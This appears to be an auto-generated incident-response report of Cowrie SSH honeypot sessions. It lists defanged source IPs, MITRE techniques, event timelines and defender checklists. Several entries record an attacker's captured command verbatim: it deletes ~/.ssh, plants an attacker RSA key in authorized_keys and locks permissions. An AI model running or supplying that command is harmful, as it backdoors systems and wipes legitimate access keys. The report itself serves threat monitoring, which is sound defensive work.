### 🔴 HIGH · IR-ed3f9df97005

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 19:53 |
| **Last Seen** | 2026-05-20 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:53:45` | `cowrie.session.connect` |
| `2026-05-20 19:53:45` | `cowrie.client.version` |
| `2026-05-20 19:53:45` | `cowrie.client.kex` |
| `2026-05-20 19:53:45` | `cowrie.login.success` |
| `2026-05-20 19:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-800125c257d2

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:54 |
| **Last Seen** | 2026-05-20 19:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:54:04` | `cowrie.session.connect` |
| `2026-05-20 19:54:04` | `cowrie.client.version` |
| `2026-05-20 19:54:05` | `cowrie.client.kex` |
| `2026-05-20 19:54:06` | `cowrie.login.success` |
| `2026-05-20 19:54:06` | `cowrie.session.params` |
| `2026-05-20 19:54:06` | `cowrie.command.input` |
| `2026-05-20 19:54:06` | `cowrie.command.failed` |
| `2026-05-20 19:54:07` | `cowrie.log.closed` |
| `2026-05-20 19:54:07` | `cowrie.session.params` |
| `2026-05-20 19:54:07` | `cowrie.command.input` |
| `2026-05-20 19:54:08` | `cowrie.session.file_download` |
| `2026-05-20 19:54:08` | `cowrie.log.closed` |
| `2026-05-20 19:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40389f56dbd8

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:54 |
| **Last Seen** | 2026-05-20 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:54:10` | `cowrie.session.connect` |
| `2026-05-20 19:54:10` | `cowrie.client.version` |
| `2026-05-20 19:54:11` | `cowrie.client.kex` |
| `2026-05-20 19:54:12` | `cowrie.login.success` |
| `2026-05-20 19:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a426e39b379b

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 19:54 |
| **Last Seen** | 2026-05-20 19:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:54:30` | `cowrie.session.connect` |
| `2026-05-20 19:54:30` | `cowrie.client.version` |
| `2026-05-20 19:54:30` | `cowrie.client.kex` |
| `2026-05-20 19:54:30` | `cowrie.login.success` |
| `2026-05-20 19:54:31` | `cowrie.session.params` |
| `2026-05-20 19:54:31` | `cowrie.command.input` |
| `2026-05-20 19:54:31` | `cowrie.command.failed` |
| `2026-05-20 19:54:31` | `cowrie.log.closed` |
| `2026-05-20 19:54:31` | `cowrie.session.params` |
| `2026-05-20 19:54:31` | `cowrie.command.input` |
| `2026-05-20 19:54:31` | `cowrie.session.file_download` |
| `2026-05-20 19:54:31` | `cowrie.log.closed` |
| `2026-05-20 19:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85e1bc66beb

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 19:54 |
| **Last Seen** | 2026-05-20 19:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:54:34` | `cowrie.session.connect` |
| `2026-05-20 19:54:34` | `cowrie.client.version` |
| `2026-05-20 19:54:34` | `cowrie.client.kex` |
| `2026-05-20 19:54:35` | `cowrie.login.success` |
| `2026-05-20 19:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab05a2662ba9

| Field | Detail |
|---|---|
| **Source IP** | `222.172.32[.]246` |
| **First Seen** | 2026-05-20 19:54 |
| **Last Seen** | 2026-05-20 19:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:54:38` | `cowrie.session.connect` |
| `2026-05-20 19:54:38` | `cowrie.client.version` |
| `2026-05-20 19:54:38` | `cowrie.client.kex` |
| `2026-05-20 19:54:38` | `cowrie.login.success` |
| `2026-05-20 19:54:39` | `cowrie.session.params` |
| `2026-05-20 19:54:39` | `cowrie.command.input` |
| `2026-05-20 19:54:39` | `cowrie.command.failed` |
| `2026-05-20 19:54:39` | `cowrie.log.closed` |
| `2026-05-20 19:54:39` | `cowrie.session.params` |
| `2026-05-20 19:54:39` | `cowrie.command.input` |
| `2026-05-20 19:54:40` | `cowrie.session.file_download` |
| `2026-05-20 19:54:40` | `cowrie.log.closed` |
| `2026-05-20 19:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.172.32[.]246` to AbuseIPDB if not already reported
- [ ] Block `222.172.32[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6abc9c2cba

| Field | Detail |
|---|---|
| **Source IP** | `222.172.32[.]246` |
| **First Seen** | 2026-05-20 19:54 |
| **Last Seen** | 2026-05-20 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:54:48` | `cowrie.session.connect` |
| `2026-05-20 19:54:48` | `cowrie.client.version` |
| `2026-05-20 19:54:48` | `cowrie.client.kex` |
| `2026-05-20 19:54:49` | `cowrie.login.success` |
| `2026-05-20 19:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.172.32[.]246` to AbuseIPDB if not already reported
- [ ] Block `222.172.32[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e4d2068cac1

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:55 |
| **Last Seen** | 2026-05-20 19:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:55:06` | `cowrie.session.connect` |
| `2026-05-20 19:55:07` | `cowrie.client.version` |
| `2026-05-20 19:55:07` | `cowrie.client.kex` |
| `2026-05-20 19:55:08` | `cowrie.login.success` |
| `2026-05-20 19:55:09` | `cowrie.session.params` |
| `2026-05-20 19:55:09` | `cowrie.command.input` |
| `2026-05-20 19:55:09` | `cowrie.command.failed` |
| `2026-05-20 19:55:09` | `cowrie.log.closed` |
| `2026-05-20 19:55:09` | `cowrie.session.params` |
| `2026-05-20 19:55:09` | `cowrie.command.input` |
| `2026-05-20 19:55:09` | `cowrie.session.file_download` |
| `2026-05-20 19:55:09` | `cowrie.log.closed` |
| `2026-05-20 19:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec2e30b98b5

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:55 |
| **Last Seen** | 2026-05-20 19:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:55:13` | `cowrie.session.connect` |
| `2026-05-20 19:55:14` | `cowrie.client.version` |
| `2026-05-20 19:55:14` | `cowrie.client.kex` |
| `2026-05-20 19:55:15` | `cowrie.login.success` |
| `2026-05-20 19:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b732e701c98

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 19:55 |
| **Last Seen** | 2026-05-20 19:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:55:57` | `cowrie.session.connect` |
| `2026-05-20 19:55:57` | `cowrie.client.version` |
| `2026-05-20 19:55:57` | `cowrie.client.kex` |
| `2026-05-20 19:55:58` | `cowrie.login.success` |
| `2026-05-20 19:55:58` | `cowrie.session.params` |
| `2026-05-20 19:55:58` | `cowrie.command.input` |
| `2026-05-20 19:55:58` | `cowrie.command.failed` |
| `2026-05-20 19:55:58` | `cowrie.log.closed` |
| `2026-05-20 19:55:59` | `cowrie.session.params` |
| `2026-05-20 19:55:59` | `cowrie.command.input` |
| `2026-05-20 19:55:59` | `cowrie.session.file_download` |
| `2026-05-20 19:55:59` | `cowrie.log.closed` |
| `2026-05-20 19:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e3149e978c6

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 19:56 |
| **Last Seen** | 2026-05-20 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:56:01` | `cowrie.session.connect` |
| `2026-05-20 19:56:01` | `cowrie.client.version` |
| `2026-05-20 19:56:01` | `cowrie.client.kex` |
| `2026-05-20 19:56:01` | `cowrie.login.success` |
| `2026-05-20 19:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c5668d6db2

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:56 |
| **Last Seen** | 2026-05-20 19:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:56:29` | `cowrie.session.connect` |
| `2026-05-20 19:56:29` | `cowrie.client.version` |
| `2026-05-20 19:56:30` | `cowrie.client.kex` |
| `2026-05-20 19:56:31` | `cowrie.login.success` |
| `2026-05-20 19:56:31` | `cowrie.session.params` |
| `2026-05-20 19:56:31` | `cowrie.command.input` |
| `2026-05-20 19:56:31` | `cowrie.command.failed` |
| `2026-05-20 19:56:32` | `cowrie.log.closed` |
| `2026-05-20 19:56:32` | `cowrie.session.params` |
| `2026-05-20 19:56:32` | `cowrie.command.input` |
| `2026-05-20 19:56:32` | `cowrie.session.file_download` |
| `2026-05-20 19:56:32` | `cowrie.log.closed` |
| `2026-05-20 19:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e05f7becdb5

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:56 |
| **Last Seen** | 2026-05-20 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:56:35` | `cowrie.session.connect` |
| `2026-05-20 19:56:35` | `cowrie.client.version` |
| `2026-05-20 19:56:35` | `cowrie.client.kex` |
| `2026-05-20 19:56:36` | `cowrie.login.success` |
| `2026-05-20 19:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c991cf5d7fa

| Field | Detail |
|---|---|
| **Source IP** | `81.192.138[.]65` |
| **First Seen** | 2026-05-20 19:57 |
| **Last Seen** | 2026-05-20 19:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:57:08` | `cowrie.session.connect` |
| `2026-05-20 19:57:08` | `cowrie.client.version` |
| `2026-05-20 19:57:08` | `cowrie.client.kex` |
| `2026-05-20 19:57:09` | `cowrie.login.success` |
| `2026-05-20 19:57:09` | `cowrie.session.params` |
| `2026-05-20 19:57:09` | `cowrie.command.input` |
| `2026-05-20 19:57:09` | `cowrie.command.failed` |
| `2026-05-20 19:57:10` | `cowrie.log.closed` |
| `2026-05-20 19:57:10` | `cowrie.session.params` |
| `2026-05-20 19:57:10` | `cowrie.command.input` |
| `2026-05-20 19:57:10` | `cowrie.session.file_download` |
| `2026-05-20 19:57:10` | `cowrie.log.closed` |
| `2026-05-20 19:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.138[.]65` to AbuseIPDB if not already reported
- [ ] Block `81.192.138[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8f946a90a8

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-20 19:57 |
| **Last Seen** | 2026-05-20 19:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:57:12` | `cowrie.session.connect` |
| `2026-05-20 19:57:12` | `cowrie.client.version` |
| `2026-05-20 19:57:12` | `cowrie.client.kex` |
| `2026-05-20 19:57:13` | `cowrie.login.success` |
| `2026-05-20 19:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0bb6fb0ee64

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:57 |
| **Last Seen** | 2026-05-20 19:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:57:36` | `cowrie.session.connect` |
| `2026-05-20 19:57:36` | `cowrie.client.version` |
| `2026-05-20 19:57:36` | `cowrie.client.kex` |
| `2026-05-20 19:57:36` | `cowrie.login.success` |
| `2026-05-20 19:57:36` | `cowrie.session.params` |
| `2026-05-20 19:57:36` | `cowrie.command.input` |
| `2026-05-20 19:57:36` | `cowrie.command.failed` |
| `2026-05-20 19:57:36` | `cowrie.log.closed` |
| `2026-05-20 19:57:36` | `cowrie.session.params` |
| `2026-05-20 19:57:36` | `cowrie.command.input` |
| `2026-05-20 19:57:36` | `cowrie.session.file_download` |
| `2026-05-20 19:57:36` | `cowrie.log.closed` |
| `2026-05-20 19:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfcd49c5156

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:57 |
| **Last Seen** | 2026-05-20 19:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:57:37` | `cowrie.session.connect` |
| `2026-05-20 19:57:37` | `cowrie.client.version` |
| `2026-05-20 19:57:38` | `cowrie.client.kex` |
| `2026-05-20 19:57:38` | `cowrie.login.success` |
| `2026-05-20 19:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d489f8fb409

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:57 |
| **Last Seen** | 2026-05-20 19:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
